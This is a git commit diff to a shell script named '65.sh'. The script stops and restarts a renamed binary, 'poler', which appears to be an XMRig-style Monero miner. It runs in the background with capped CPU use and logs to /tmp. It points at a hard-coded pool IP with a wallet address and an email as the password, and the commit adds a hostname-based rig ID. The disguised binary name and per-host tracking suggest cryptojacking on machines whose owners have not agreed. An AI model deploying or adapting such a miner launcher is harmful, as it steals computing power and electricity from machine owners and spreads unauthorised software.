2b78120d650b51c373ce4dd71c9dc26c97ebef52
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-03-21 05:00:38 +0200

    Update 65.sh

--- 65.sh
+++ 65.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx65.log --donate-level 1 --max-cpu-usage 46 --cpu-priority 3 -o 185.251.39.216:5987 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 -p nehay:ivanovandrey1984g@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 46 --cpu-priority 4 -o 185.251.39.216:5987 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 -p x:ivanovandrey1984g@gmail.com --rig-id="$(hostname)" -k
